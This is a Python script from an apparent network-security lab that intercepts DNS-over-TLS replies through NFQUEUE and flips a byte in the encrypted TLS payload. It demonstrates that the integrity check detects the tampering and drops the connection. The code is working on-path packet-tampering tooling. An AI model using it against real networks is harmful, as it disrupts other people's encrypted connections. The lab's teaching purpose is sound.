#!/usr/bin/env python3
"""
Phase 7 attack (i) -- alter the (encrypted) answer in transit.

Runs on the attacker container, which resolver->client TCP:853 replies
already transit (the always-on reply-diversion route edge-router sets
up, same mechanism as Phase 6's:
`ip route add 172.16.1.1{0,1}/32 via 172.16.1.100`). Every such packet
is queued to userspace via NFQUEUE (the matching iptables rule is added
in entrypoint.sh); when FORGE_FLAG exists on disk, this flips one byte
inside the TCP payload (if the segment carries one) and recomputes the
IP/TCP checksums before reinjecting -- the same "touch only what an
on-path attacker could touch, nothing else" discipline as every earlier
phase's interceptor, just applied to an opaque, already-encrypted TLS
record instead of parseable DNS rdata, because past this point there is
no rdata to parse.

Expected result: the client's TLS stack detects the corrupted
authenticated ciphertext (the AEAD integrity check fails) and tears the
connection down. This attack can never successfully *forge* an answer,
only break the connection -- that IS the demonstration: encryption with
integrity protection makes in-flight tampering detectable, not merely
unreadable.
"""
import os
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP

FORGE_FLAG = "/tmp/forge_enabled"
QUEUE_NUM = 0


def handle(pkt):
    data = pkt.get_payload()
    scapy_pkt = IP(data)
    if (os.path.exists(FORGE_FLAG)
            and scapy_pkt.haslayer(TCP)
            and bytes(scapy_pkt[TCP].payload)):
        raw = bytes(scapy_pkt[TCP].payload)
        corrupted = bytearray(raw)
        corrupted[-1] ^= 0xFF  # flip the last byte of this TLS record fragment
        scapy_pkt[TCP].remove_payload()
        scapy_pkt[TCP].add_payload(bytes(corrupted))
        del scapy_pkt[IP].len
        del scapy_pkt[IP].chksum
        del scapy_pkt[TCP].chksum
        scapy_pkt = IP(bytes(scapy_pkt))  # forces recompute of len/checksums
        print(f"[corrupt] flipped 1 byte in a {len(raw)}-byte TLS segment "
              f"{scapy_pkt[IP].src}:{scapy_pkt[TCP].sport} -> "
              f"{scapy_pkt[IP].dst}:{scapy_pkt[TCP].dport}", flush=True)
        pkt.set_payload(bytes(scapy_pkt))
    pkt.accept()


def main():
    nfqueue = NetfilterQueue()
    nfqueue.bind(QUEUE_NUM, handle)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
